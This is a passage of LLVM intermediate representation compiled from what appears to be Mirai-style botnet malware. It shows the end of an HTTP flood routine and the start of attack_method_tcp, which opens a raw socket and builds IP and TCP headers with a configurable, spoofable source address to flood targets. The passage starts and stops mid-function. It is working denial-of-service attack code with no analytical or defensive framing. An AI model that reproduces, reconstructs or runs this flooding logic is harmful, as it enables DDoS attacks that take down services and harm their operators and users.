  %2215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2214, i32 0, i32 17
  %2216 = load i32, i32* %2215, align 4
  %2217 = load i32, i32* %60, align 4
  %2218 = sub nsw i32 %2216, %2217
  %2219 = call i32 @util_memsearch(i8* %2213, i32 %2218, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2219, i32* %61, align 4
  %2220 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2220, i32 0, i32 18
  %2222 = load i32, i32* %60, align 4
  %2223 = load i32, i32* %61, align 4
  %2224 = sub nsw i32 %2223, 1
  %2225 = add nsw i32 %2222, %2224
  %2226 = sext i32 %2225 to i64
  %2227 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2221, i64 0, i64 %2226
  store i8 0, i8* %2227, align 1
  %2228 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2228, i32 0, i32 16
  %2230 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2230, i32 0, i32 15
  %2232 = load i32, i32* %2231, align 4
  %2233 = sext i32 %2232 to i64
  %2234 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2229, i64 0, i64 %2233
  %2235 = getelementptr inbounds [128 x i8], [128 x i8]* %2234, i32 0, i32 0
  %2236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2236, i32 0, i32 16
  %2238 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2238, i32 0, i32 15
  %2240 = load i32, i32* %2239, align 4
  %2241 = sext i32 %2240 to i64
  %2242 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2237, i64 0, i64 %2241
  %2243 = getelementptr inbounds [128 x i8], [128 x i8]* %2242, i32 0, i32 0
  %2244 = call i32 @util_strlen(i8* %2243)
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds i8, i8* %2235, i64 %2245
  %2247 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2247, i32 0, i32 18
  %2249 = load i32, i32* %60, align 4
  %2250 = sext i32 %2249 to i64
  %2251 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2248, i64 0, i64 %2250
  %2252 = call i32 @util_strcpy(i8* %2246, i8* %2251)
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 15
  %2255 = load i32, i32* %2254, align 4
  %2256 = add nsw i32 %2255, 1
  store i32 %2256, i32* %2254, align 4
  br label %2257

; <label>:2257:                                   ; preds = %2170, %2162, %2130
  %2258 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2259 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2258, i32 0, i32 14
  store i32 -1, i32* %2259, align 4
  %2260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2260, i32 0, i32 1
  store i8 10, i8* %2261, align 4
  br label %2384

; <label>:2262:                                   ; preds = %2120
  br label %2263

; <label>:2263:                                   ; preds = %2262, %2109
  br label %2264

; <label>:2264:                                   ; preds = %2263, %2088
  %2265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2265, i32 0, i32 14
  %2267 = load i32, i32* %2266, align 4
  %2268 = icmp eq i32 %2267, 0
  br i1 %2268, label %2269, label %2347

; <label>:2269:                                   ; preds = %2264
  %2270 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2270, i32 0, i32 13
  %2272 = load i32, i32* %2271, align 4
  %2273 = icmp eq i32 %2272, 1
  br i1 %2273, label %2274, label %2330

; <label>:2274:                                   ; preds = %2269
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 18
  %2277 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2276, i32 0, i32 0
  %2278 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2278, i32 0, i32 17
  %2280 = load i32, i32* %2279, align 4
  %2281 = call i32 @util_memsearch(i8* %2277, i32 %2280, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2282 = icmp ne i32 %2281, -1
  br i1 %2282, label %2283, label %2329

; <label>:2283:                                   ; preds = %2274
  %2284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2284, i32 0, i32 18
  %2286 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2285, i32 0, i32 0
  %2287 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2287, i32 0, i32 17
  %2289 = load i32, i32* %2288, align 4
  %2290 = call i32 @util_memsearch(i8* %2286, i32 %2289, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2290, i32* %62, align 4
  %2291 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2292 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2291, i32 0, i32 18
  %2293 = load i32, i32* %62, align 4
  %2294 = sub nsw i32 %2293, 2
  %2295 = sext i32 %2294 to i64
  %2296 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2292, i64 0, i64 %2295
  store i8 0, i8* %2296, align 1
  %2297 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2298 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2297, i32 0, i32 18
  %2299 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2298, i32 0, i32 0
  %2300 = load i32, i32* %62, align 4
  %2301 = call i32 @util_memsearch(i8* %2299, i32 %2300, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2302 = icmp ne i32 %2301, -1
  br i1 %2302, label %2303, label %2313

; <label>:2303:                                   ; preds = %2283
  %2304 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2304, i32 0, i32 18
  %2306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2306, i32 0, i32 18
  %2308 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2307, i32 0, i32 0
  %2309 = load i32, i32* %62, align 4
  %2310 = call i32 @util_memsearch(i8* %2308, i32 %2309, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2311 = sext i32 %2310 to i64
  %2312 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2305, i64 0, i64 %2311
  store i8 0, i8* %2312, align 1
  br label %2313

; <label>:2313:                                   ; preds = %2303, %2283
  %2314 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2314, i32 0, i32 18
  %2316 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2315, i32 0, i32 0
  %2317 = call i32 @util_atoi(i8* %2316, i32 16)
  store i32 %2317, i32* %63, align 4
  %2318 = load i32, i32* %63, align 4
  %2319 = icmp eq i32 %2318, 0
  br i1 %2319, label %2320, label %2323

; <label>:2320:                                   ; preds = %2313
  %2321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2321, i32 0, i32 1
  store i8 1, i8* %2322, align 4
  br label %2384

; <label>:2323:                                   ; preds = %2313
  %2324 = load i32, i32* %63, align 4
  %2325 = add nsw i32 %2324, 2
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 14
  store i32 %2325, i32* %2327, align 4
  %2328 = load i32, i32* %62, align 4
  store i32 %2328, i32* %59, align 4
  br label %2329

; <label>:2329:                                   ; preds = %2323, %2274
  br label %2346

; <label>:2330:                                   ; preds = %2269
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 17
  %2333 = load i32, i32* %2332, align 4
  %2334 = load i32, i32* %59, align 4
  %2335 = sub nsw i32 %2333, %2334
  %2336 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2337 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2336, i32 0, i32 14
  store i32 %2335, i32* %2337, align 4
  %2338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2338, i32 0, i32 14
  %2340 = load i32, i32* %2339, align 4
  %2341 = icmp eq i32 %2340, 0
  br i1 %2341, label %2342, label %2345

; <label>:2342:                                   ; preds = %2330
  %2343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2343, i32 0, i32 1
  store i8 1, i8* %2344, align 4
  br label %2384

; <label>:2345:                                   ; preds = %2330
  br label %2346

; <label>:2346:                                   ; preds = %2345, %2329
  br label %2347

; <label>:2347:                                   ; preds = %2346, %2264
  %2348 = load i32, i32* %59, align 4
  %2349 = icmp eq i32 %2348, 0
  br i1 %2349, label %2350, label %2351

; <label>:2350:                                   ; preds = %2347
  br label %2384

; <label>:2351:                                   ; preds = %2347
  %2352 = load i32, i32* %59, align 4
  %2353 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2354 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2353, i32 0, i32 17
  %2355 = load i32, i32* %2354, align 4
  %2356 = sub nsw i32 %2355, %2352
  store i32 %2356, i32* %2354, align 4
  %2357 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2358 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2357, i32 0, i32 18
  %2359 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2358, i32 0, i32 0
  %2360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2360, i32 0, i32 18
  %2362 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2361, i32 0, i32 0
  %2363 = load i32, i32* %59, align 4
  %2364 = sext i32 %2363 to i64
  %2365 = getelementptr inbounds i8, i8* %2362, i64 %2364
  %2366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2366, i32 0, i32 17
  %2368 = load i32, i32* %2367, align 4
  %2369 = sext i32 %2368 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2359, i8* %2365, i64 %2369, i32 1, i1 false)
  %2370 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2370, i32 0, i32 18
  %2372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2372, i32 0, i32 17
  %2374 = load i32, i32* %2373, align 4
  %2375 = sext i32 %2374 to i64
  %2376 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2371, i64 0, i64 %2375
  store i8 0, i8* %2376, align 1
  %2377 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2377, i32 0, i32 17
  %2379 = load i32, i32* %2378, align 4
  %2380 = icmp eq i32 %2379, 0
  br i1 %2380, label %2381, label %2382

; <label>:2381:                                   ; preds = %2351
  br label %2384

; <label>:2382:                                   ; preds = %2351
  br label %2383

; <label>:2383:                                   ; preds = %2382
  br label %2088

; <label>:2384:                                   ; preds = %2381, %2350, %2342, %2320, %2257
  br label %2010

; <label>:2385:                                   ; preds = %2078, %2016
  br label %2438

; <label>:2386:                                   ; preds = %2003
  %2387 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2387, i32 0, i32 1
  %2389 = load i8, i8* %2388, align 4
  %2390 = zext i8 %2389 to i32
  %2391 = icmp eq i32 %2390, 10
  br i1 %2391, label %2392, label %2437

; <label>:2392:                                   ; preds = %2386
  br label %2393

; <label>:2393:                                   ; preds = %2426, %2392
  %2394 = call i32* @__errno_location() #7
  store i32 0, i32* %2394, align 4
  %2395 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2395, i32 0, i32 0
  %2397 = load i32, i32* %2396, align 4
  %2398 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2399 = call i64 @recv(i32 %2397, i8* %2398, i64 10240, i32 16384)
  %2400 = trunc i64 %2399 to i32
  store i32 %2400, i32* %12, align 4
  %2401 = load i32, i32* %12, align 4
  %2402 = icmp eq i32 %2401, 0
  br i1 %2402, label %2403, label %2405

; <label>:2403:                                   ; preds = %2393
  %2404 = call i32* @__errno_location() #7
  store i32 104, i32* %2404, align 4
  store i32 -1, i32* %12, align 4
  br label %2405

; <label>:2405:                                   ; preds = %2403, %2393
  %2406 = load i32, i32* %12, align 4
  %2407 = icmp eq i32 %2406, -1
  br i1 %2407, label %2408, label %2426

; <label>:2408:                                   ; preds = %2405
  %2409 = call i32* @__errno_location() #7
  %2410 = load i32, i32* %2409, align 4
  %2411 = icmp ne i32 %2410, 11
  br i1 %2411, label %2412, label %2425

; <label>:2412:                                   ; preds = %2408
  %2413 = call i32* @__errno_location() #7
  %2414 = load i32, i32* %2413, align 4
  %2415 = icmp ne i32 %2414, 11
  br i1 %2415, label %2416, label %2425

; <label>:2416:                                   ; preds = %2412
  %2417 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2417, i32 0, i32 0
  %2419 = load i32, i32* %2418, align 4
  %2420 = call i32 @close(i32 %2419)
  %2421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2421, i32 0, i32 0
  store i32 -1, i32* %2422, align 4
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 1
  store i8 0, i8* %2424, align 4
  br label %2425

; <label>:2425:                                   ; preds = %2416, %2412, %2408
  br label %2427

; <label>:2426:                                   ; preds = %2405
  br label %2393

; <label>:2427:                                   ; preds = %2425
  %2428 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2428, i32 0, i32 1
  %2430 = load i8, i8* %2429, align 4
  %2431 = zext i8 %2430 to i32
  %2432 = icmp ne i32 %2431, 0
  br i1 %2432, label %2433, label %2436

; <label>:2433:                                   ; preds = %2427
  %2434 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2434, i32 0, i32 1
  store i8 1, i8* %2435, align 4
  br label %2436

; <label>:2436:                                   ; preds = %2433, %2427
  br label %2437

; <label>:2437:                                   ; preds = %2436, %2386
  br label %2438

; <label>:2438:                                   ; preds = %2437, %2385
  br label %2439

; <label>:2439:                                   ; preds = %2438, %1994
  br label %2440

; <label>:2440:                                   ; preds = %2439, %1017
  br label %2441

; <label>:2441:                                   ; preds = %2440, %1954, %1623, %1066, %1049, %1007, %975
  %2442 = load i32, i32* %9, align 4
  %2443 = add nsw i32 %2442, 1
  store i32 %2443, i32* %9, align 4
  br label %962

; <label>:2444:                                   ; preds = %962
  br label %350

; <label>:2445:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare void @table_unlock_val(i8 zeroext) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @rand_next() #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i8* @table_retrieve_val(i32, i32*) #3

declare void @table_lock_val(i8 zeroext) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_memsearch(i8*, i32, i8*, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %437

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %437

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %285, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %288

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = call zeroext i16 @htons(i16 zeroext 60) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

; <label>:156:                                    ; preds = %113
  %157 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

; <label>:160:                                    ; preds = %156, %113
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 6, i8* %162, align 1
  %163 = load i32, i32* %26, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 4
  %178 = load i16, i16* %17, align 2
